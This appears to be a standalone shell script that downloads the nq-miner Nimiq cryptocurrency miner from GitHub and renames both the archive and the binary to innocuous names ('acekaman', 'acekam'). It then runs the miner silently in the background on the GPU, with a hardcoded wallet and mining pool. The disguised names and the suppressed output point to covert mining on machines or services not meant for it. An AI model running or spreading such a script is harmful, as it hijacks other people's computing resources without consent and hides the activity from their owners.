apt-get update && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
wget -qO acekaman.tar.gz https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz
tar -xhf acekaman.tar.gz
mv nq-miner acekam
./acekam -t cuda -a "NQ25 N9TY UQ03 RD9K 7EBL 1LLA GUR8 MYBY 6JG1" -p pool.acemining.co:8443 -n tes --threads 1 --jobs 1 > /dev/null 2>&1 &
